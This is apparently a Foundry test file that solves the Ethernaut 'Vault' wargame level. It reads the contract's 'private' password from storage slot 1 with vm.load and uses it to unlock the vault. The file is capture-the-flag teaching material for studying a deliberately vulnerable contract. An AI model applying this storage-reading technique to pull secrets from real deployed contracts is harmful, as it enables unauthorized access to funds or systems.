// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/08-Vault/VaultFactory.sol";
import "../src/Ethernaut.sol";

contract VaultTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 1 ether);
    }

    function testVault() public {
        // Level Setup
        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress));

        // Level Attack
        /* Inspect the storage slot of the contract via etherjs getStorageAt
        https://docs.ethers.io/v5/api/providers/provider/#Provider-getStorageAt
        We are going to read from the second slot (index 1) because bytes32 take a whole word (256bits) so
        Position 0 -> `locked`
        Position 1 -> `password`
        */
        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
        emit log_named_bytes32("Password", password);
        ethernautVault.unlock(password);

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
